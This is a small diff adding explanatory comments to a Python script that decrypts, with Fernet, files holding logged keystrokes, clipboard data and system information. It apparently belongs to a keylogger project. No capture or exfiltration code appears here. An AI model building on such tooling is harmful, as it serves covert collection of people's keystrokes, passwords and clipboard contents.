@@ -2,9 +2,9 @@ from cryptography.fernet import Fernet
 
 key = " " # Enter your encryption key here
 
-system_information_e = 'e_system.txt'
-clipboard_information_e = 'e_clipboard.txt'
-keys_information_e = 'e_keys_logged.txt'
+system_information_e = 'e_system.txt' # Decrypts the Encrypted System Configuration related Data
+clipboard_information_e = 'e_clipboard.txt' # Decrypts the Encrypted Clipboard Data
+keys_information_e = 'e_keys_logged.txt' # Decrypts the Encrypted Keylogged Data
 
 encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
 count = 0
